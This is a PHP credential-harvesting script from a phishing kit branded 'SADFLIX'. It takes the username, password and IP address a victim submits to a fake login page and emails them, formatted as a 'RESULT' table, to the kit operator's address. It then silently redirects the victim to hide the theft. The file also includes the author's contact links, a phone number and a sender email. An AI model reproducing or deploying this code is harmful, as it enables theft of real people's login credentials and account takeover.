<?php
$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$subject = "RESULT BEB♥️ | [$user]";
$message = '
<center> 
<div style="background: url(https://i.ibb.co/XCcRdM5/anime-girl-student-sunrise-uhdpaper-com-4-K-6-1004-wp-thumbnail-picsay.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 80px; color: #000; text-align: center; border-top-left-radius: 10px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 100; color: #fff; text-align: left; padding: 10px;">INFO ACCOUNT :</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ip.'</th> 
</tr>
 </table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Contact Me:
</div>
<div style="float: right;">
<a href="https://facebook.com/sadflix.org"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
<a href="https://wa.me/447418330803"><img style="margin: 5px;" width="30" src="https://i.ibb.co/J7PQt8h/1586333120464.png"></a>
</div>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: SADFLIX <cxahmad83@gmail.com>' . "\r\n";
$datamail = mail($sadflix, $subject, $message, $headersx);
?>
<!--POWERED BY SADFLIX-->
<!--DONT CHANGE COPYRIGHT KIDS xD-->
<!--DONT REUPLOAD TO YOUR FUCKING CHANNEL-->
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=/">
</head>
<body>
</body>
</html>